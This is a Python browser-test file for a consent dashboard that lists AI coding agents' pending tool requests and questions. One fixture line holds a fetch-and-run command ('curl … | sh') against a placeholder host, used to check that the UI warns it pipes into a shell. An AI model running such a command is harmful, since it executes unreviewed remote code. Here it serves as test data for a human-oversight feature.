"""K4 session 1, the Needs-you strip: the pending consent requests and open questions as inline cards under the now band,
loudest first, absent when nothing waits; a consent card carries no rec and Allow and Deny weigh the same (F11 a); a question
keeps its rec; the CLI line sits behind "details"; the Decisions tile names the top item and a click on it goes to the strip
(no modal); the Sessions tile says live / quiet and names the busiest."""
from __future__ import annotations

import json
from datetime import timedelta
from pathlib import Path

from levain.consent.queue import ConsentQueue, authority_source
from levain.consent.questions import QuestionStore
from tests.test_cockpit_flip_parity import _drive, needs_browser
from tests.test_cockpit_k2a import _install, _serve
from tests.test_cockpit_k7_build import _sessions_fixture
from tests._h4 import h4_home

DESKTOP = {"emulate": {"w": 1440, "h": 900, "dpr": 1}}
TILE = "[...document.querySelectorAll('.ck-widgets .ck-card.w')].find(c => /^Decisions waiting/i.test(c.innerText))"
SESS_TILE = "[...document.querySelectorAll('.ck-widgets .ck-card.w')].find(c => /^Sessions/i.test(c.innerText))"
CARDS = "[...document.querySelectorAll('#ck-needs .needs-card')]"
# the one consent card that carries its Open row, picked the same way for the wait, the read and the click
CARD = "[...document.querySelectorAll('#ck-needs .needs-consent')].find(c => c.querySelector('.needs-open'))"
READY = "document.querySelector('#ck-needs .needs-card .consent-display') && document.querySelector('#ck-needs .needs-question .question-option')"
# a consent chip is drawn as its tool and gains its first words when the request body loads (async): wait for both of
# _waiting's consent chips (an empty list would pass .every before the bar is drawn)
CHIPS_FILLED = ("(l => l.length === 2 && l.every(b => b.textContent.includes(' ')))("
                "[...document.querySelectorAll('#ck-needs .needs-chip-btn[data-needs-id^=\"consent:\"]')])")


def _waiting(tmp_path: Path, monkeypatch) -> Path:
    """A levain home with two pending consent requests (the second expires sooner) and one open question."""
    home = tmp_path / "levain_home"
    monkeypatch.setenv("LEVAIN_HOME", str(home))
    (home / "consent").mkdir(parents=True, mode=0o700)
    q = ConsentQueue(home / "consent", authority=authority_source(home / "consent", anchor=None), home=h4_home())
    q.file(agent="claude_code", agent_session_id="s", tool_name="Write", tool_input={"file_path": "/w/CHANGELOG.md", "content": "x"},
           cwd="/w", hold=timedelta(minutes=50), event_id="a")
    q.file(agent="codex", agent_session_id="s2", tool_name="Bash", tool_input={"command": "curl -s https://x.example/i.sh | sh"},
           cwd="/w", hold=timedelta(minutes=5), event_id="b")
    QuestionStore(home / "consent").file(agent="claude_code", agent_session_id="s1", what="Ship the sweep fix tonight or hold it?",
                                         options=[("ship", "Ship it tonight"), ("hold", "Hold for the morning")], rec="hold",
                                         blocks="the nightly sweep stays red", cwd="/w")
    return home


@needs_browser
def test_the_strip_lists_what_waits_loudest_first_and_a_bare_install_has_no_strip(tmp_path: Path, monkeypatch) -> None:
    _root, src, _ids = _install(tmp_path)          # nothing waits: no strip, no empty card, no bare heading, the band is drawn
    with _serve(src, surface_tokens={"browser": "T"}, install_class="reported") as (url, _httpd):
        bare = _drive(tmp_path, f"{url}/#write_token=T", [DESKTOP,
            {"until": "document.querySelector('.ck-widgets .ck-card.w')"},
            {"eval": "new Promise(r => setTimeout(() => r(1), 800))"},
            {"eval": "(() => { const n = document.getElementById('ck-needs'); const b = document.getElementById('ck-band');"
                     " return [!n || n.hidden || n.offsetHeight === 0, document.querySelectorAll('.needs-card').length,"
                     " !!n && /needs you/i.test(n.innerText) && n.offsetHeight > 0, b.innerText.trim().length > 0]; })()"}])["values"][-1]
    assert bare == [True, 0, False, True], bare
    tmp2 = tmp_path / "waiting"
    tmp2.mkdir()
    _waiting(tmp2, monkeypatch)
    _root, src, _ids = _install(tmp2)
    with _serve(src, surface_tokens={"browser": "T"}, install_class="reported") as (url, _httpd):
        got = _drive(tmp2, f"{url}/#write_token=T", [DESKTOP, {"until": READY}, {"until": CHIPS_FILLED},
            {"eval": f"JSON.stringify({{kinds: {CARDS}.map(c => c.dataset.needsCard), tools: {CARDS}.map(c => (c.querySelector('.consent-tool')||{{}}).textContent),"
                     " head: document.querySelector('#ck-needs').innerText.slice(0, 40),"
                     " order: (document.querySelector('#ck-needs .needs-order') || {textContent: ''}).textContent,"
                     " bar: [...document.querySelectorAll('#ck-needs .needs-chip-btn')].map(b => b.textContent),"
                     " above: document.getElementById('ck-needs').getBoundingClientRect().top > document.getElementById('ck-hero').getBoundingClientRect().top})"}])["values"][-1]
    got = json.loads(got)
    assert got["kinds"] == ["question", "consent", "consent"], got      # as the mock draws it: the open question first, then the clocked requests, soonest expiry first
    assert got["tools"][1:] == ["Bash", "Write"], got
    assert got["head"].lower().startswith("needs you") and got["above"] is True, got
    assert "questions first, then soonest to expire" in got["order"].lower(), got
    # the bar (the only surface on Build and Memory) leads with the clocked requests, as the mock's Build bar does
    assert got["bar"][0].startswith("Bash ") and got["bar"][1].startswith("Write ") and len(got["bar"]) == 3, got   # consents, then the question


@needs_browser
def test_a_consent_card_carries_no_rec_and_allow_and_deny_weigh_the_same_with_the_hint_line(tmp_path: Path, monkeypatch) -> None:
    _waiting(tmp_path, monkeypatch)
    _root, src, _ids = _install(tmp_path)
    with _serve(src, surface_tokens={"browser": "T"}, install_class="reported") as (url, _httpd):
        got = _drive(tmp_path, f"{url}/#write_token=T", [DESKTOP, {"until": READY},
            {"eval": "(() => { const c = document.querySelector('#ck-needs .needs-consent'); const bs = [...c.querySelectorAll('.needs-btn')];"
                     " const s = (b) => { const k = getComputedStyle(b); return [k.backgroundColor, k.color, k.borderTopColor, k.fontWeight, Math.round(b.getBoundingClientRect().width)]; };"
                     " return JSON.stringify({labels: bs.map(b => b.textContent.trim()), cls: bs.map(b => b.className), styles: bs.map(s),"
                     " rec: /\\brec\\b|recommend/i.test(c.innerText) || !!c.querySelector('[class*=rec]'),"
                     " hint: (c.querySelector('.consent-hint') || {}).textContent || '', phone: /phone/i.test(c.innerText)}); })()"}])["values"][-1]
    got = json.loads(got)
    assert got["labels"] == ["Allow", "Deny"], got
    assert got["cls"][0] == got["cls"][1], got                          # the same component, no solid fill on one
    assert got["styles"][0][:4] == got["styles"][1][:4] and abs(got["styles"][0][4] - got["styles"][1][4]) <= 2, got
    assert got["rec"] is False, got
    assert "pipes into a shell" in got["hint"], got                         # the Q16 hint stays: it informs
    assert got["phone"] is True, got                                    # no re-ping route exists: the card says to answer on the phone


@needs_browser
def test_a_question_card_keeps_its_rec_and_its_cli_line_sits_behind_details(tmp_path: Path, monkeypatch) -> None:
    _waiting(tmp_path, monkeypatch)
    _root, src, _ids = _install(tmp_path)
    with _serve(src, surface_tokens={"browser": "T"}, install_class="reported") as (url, _httpd):
        out = _drive(tmp_path, f"{url}/#write_token=T", [DESKTOP, {"until": READY},
            {"until": CARD + " && document.querySelector('#ck-needs .needs-question .question-option')"},
            {"eval": "(() => { const q = document.querySelector('#ck-needs .needs-question'); return JSON.stringify({"
                     " recText: /REC\\s+hold\\./.test(q.innerText), title: (q.querySelector('.needs-q-title')||{}).textContent, recBtn: [...q.querySelectorAll('.question-option')].map(b => [b.textContent, b.classList.contains('question-rec')]),"
                     " words: !!q.querySelector('.question-words')}); })()"},
            {"eval": "(() => { const c = " + CARD + "; return JSON.stringify({hasOpen: !!c.querySelector('.needs-open'), inlineCmd: !!c.querySelector('.consent-code')}); })()"},
            {"eval": CARD + ".querySelector('.needs-open').click(); 1"},
            {"until": "document.querySelector('#levain-modal .needs-terminal .consent-code')"},
            {"eval": "JSON.stringify({cmd: document.querySelector('#levain-modal .needs-terminal .consent-code').textContent})"}])["values"]
    q, before, after = json.loads(out[-5]), json.loads(out[-4]), json.loads(out[-1])
    assert q["title"] == "Ship the sweep fix tonight or hold it?", q
    assert not any("recommended" in b[0] for b in q["recBtn"]), q          # the fill and the REC line say it
    assert q["recText"] and q["words"] and ["hold", True] == [q["recBtn"][1][0].split(" ")[0], q["recBtn"][1][1]] and q["recBtn"][0][1] is False, q
    # The K-polish pass (Phill L2: "each should either be scrollable or open into a model with all info well organized") moved the CLI
    # route from an inline disclosure to the card's "Open" row: the strip card carries no command, the focus view does.
    assert before == {"hasOpen": True, "inlineCmd": False}, before
    assert after["cmd"].startswith("levain consent answer "), after


@needs_browser
def test_the_decisions_tile_names_the_top_item_and_a_click_goes_to_the_strip_with_no_modal(tmp_path: Path, monkeypatch) -> None:
    _waiting(tmp_path, monkeypatch)
    _root, src, _ids = _install(tmp_path)
    with _serve(src, surface_tokens={"browser": "T"}, install_class="reported") as (url, _httpd):
        out = _drive(tmp_path, f"{url}/#write_token=T", [DESKTOP, {"until": READY},
            {"eval": f"{TILE}.innerText.replace(/\\s+/g, ' ')"},
            {"eval": f"(async () => {{ {TILE}.click(); await new Promise(r => setTimeout(r, 300)); return [!document.getElementById('levain-modal'), !!document.activeElement.closest('#ck-needs')]; }})()"}])["values"]
    assert "question #1" in out[-2], out                                # the top item is named, not just counted: the open question leads, as the mock's tile does
    assert out[-1] == [True, True], out                                  # no modal; focus is in the strip


@needs_browser
def test_the_sessions_tile_says_live_and_quiet_and_names_the_busiest(tmp_path: Path, monkeypatch) -> None:
    _root, src = _sessions_fixture(tmp_path, monkeypatch)
    with _serve(src, surface_tokens={"browser": "T"}, install_class="reported") as (url, _httpd):
        out = _drive(tmp_path, f"{url}/#write_token=T", [DESKTOP, {"until": f"{SESS_TILE}"},
            {"eval": "new Promise(r => setTimeout(() => r(1), 800))"},
            {"eval": f"({SESS_TILE}.innerText + ' ' + [...{SESS_TILE}.querySelectorAll('[title]')].map(e => e.title).join(' ')).replace(/\\s+/g, ' ')"}])["values"][-1]   # the busiest rides the tile's title, off the counts line
    text = out.lower()
    assert "live" in text and "quiet" in text and "busiest" in text, out


@needs_browser
def test_time_left_reads_in_whole_units_never_minutes_and_seconds(tmp_path: Path, monkeypatch) -> None:
    _waiting(tmp_path, monkeypatch)
    _root, src, _ids = _install(tmp_path)
    with _serve(src, surface_tokens={"browser": "T"}, install_class="reported") as (url, _httpd):
        got = _drive(tmp_path, f"{url}/#write_token=T", [DESKTOP, {"until": READY},
            {"eval": "JSON.stringify({cards: [...document.querySelectorAll('#ck-needs .needs-consent .needs-left')].map(n => n.textContent),"
                     " tile: " + TILE + ".innerText.replace(/\\s+/g, ' ')})"}])["values"][-1]
    got = json.loads(got)
    assert got["cards"][0].endswith(" m left") and not any(__import__("re").search(r"\d+m\d+s", c) for c in got["cards"]), got
    assert not __import__("re").search(r"\d+m\d+s", got["tile"]), got


@needs_browser
def test_a_record_click_lights_its_card_and_build_draws_one_bar(tmp_path: Path, monkeypatch) -> None:
    _waiting(tmp_path, monkeypatch)
    _root, src, _ids = _install(tmp_path)
    with _serve(src, surface_tokens={"browser": "T"}, install_class="reported") as (url, _httpd):
        out = _drive(tmp_path, f"{url}/#write_token=T", [DESKTOP, {"until": READY},
            {"eval": "(() => { const id = document.querySelector('#ck-needs .needs-consent').dataset.needsId; const ok = window.LevainNeeds.go(id);"
                     " return JSON.stringify({id, ok, lit: document.querySelectorAll('.needs-lit').length, none: window.LevainNeeds.go('consent:nope')}); })()"},
            {"eval": "new Promise(r => setTimeout(() => r(document.querySelectorAll('.needs-lit').length), 2000))"},
            {"eval": "(() => { window.LevainCockpitKinds.applyMode('build', true); return new Promise(r => setTimeout(() => { const n = document.getElementById('ck-needs');"
                     " r(JSON.stringify({bar: getComputedStyle(n.querySelector('.needs-bar')).display, grid: getComputedStyle(n.querySelector('.needs-grid')).display,"
                     " chips: n.querySelectorAll('.needs-chip-btn').length, btn: /Open on Board/.test(n.innerText)})); }, 300)); })()"}])["values"]
    a, gone, bar = json.loads(out[-3]), out[-2], json.loads(out[-1])
    assert a["ok"] is True and a["lit"] == 1 and a["none"] is False, a
    assert gone == 0, gone                                              # the light ends by itself: no class left behind
    assert bar["bar"] != "none" and bar["grid"] == "none" and bar["chips"] == 3 and bar["btn"], bar
